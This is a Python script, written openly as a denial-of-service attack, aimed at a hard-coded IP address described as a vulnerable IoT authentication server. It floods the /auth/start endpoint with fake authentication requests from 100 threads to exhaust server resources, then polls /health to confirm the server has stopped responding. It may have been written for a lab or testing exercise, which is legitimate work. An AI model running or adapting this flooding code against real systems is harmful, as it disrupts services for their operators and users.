import threading
import requests
import time

# Target server - the vulnerable IoT authentication system
TARGET = "http://188.218.211.175:5050" #ip of the server
# Attack parameters - high thread count to maximize concurrent load
NUM_THREADS = 100
DURATION_SECONDS = 60

# Global control variables for attack coordination
stop = False  # Signal to stop all threads
count = 0    # Total requests counter across all threads

def spam():
    """
    Worker function executed by each attack thread.
    Continuously sends fake authentication requests to exhaust server resources.
    """
    global count
    i = 0
    while not stop:
        try:
            i += 1
            # ATTACK PAYLOAD: Fake authentication requests that trigger expensive crypto operations
            # Each request forces the server to:
            # 1. Parse JSON payload
            # 2. Validate device_id format
            # 3. Generate cryptographic challenges (C1, r1)
            # 4. Perform vault database lookups
            # 5. Log the authentication attempt
            requests.post(
                f"{TARGET}/auth/start",
                json={"device_id": "fake_id", "session_id": f"dos-{threading.current_thread().name}-{i}"},
                timeout=30
            )
            count += 1
        except:
            # Ignore network errors - continue attacking even if server is struggling
            pass

print(f"[*] DoS start with {NUM_THREADS} thread per {DURATION_SECONDS} seconds...")
print(f"[*] Target: {TARGET}")

# Thread management - create army of attack threads
threads = []
for i in range(NUM_THREADS):
    t = threading.Thread(target=spam, name=f"t{i}", daemon=True)
    t.start()
    threads.append(t)

# Attack monitoring loop - track progress and server health
start = time.time()
while time.time() - start < DURATION_SECONDS:
    time.sleep(2)
    # HEALTH CHECK: Monitor if server is still responsive during attack
    # The /health endpoint should be lightweight and not require authentication
    try:
        r = requests.get(f"{TARGET}/health", timeout=5)
        ms = r.elapsed.total_seconds() * 1000
        print(f"[{int(time.time()-start)}s] Requests sent: {count} | /health response in {ms:.0f}ms")
    except:
        # SERVER DOWN: Attack successful - server overwhelmed and unresponsive
        print(f"[{int(time.time()-start)}s] Requests sent: {count} | /health NOT RESPONDING! Server blocked!")

# Attack termination
stop = True
print(f"\n[*] End. Total requests sent: {count}")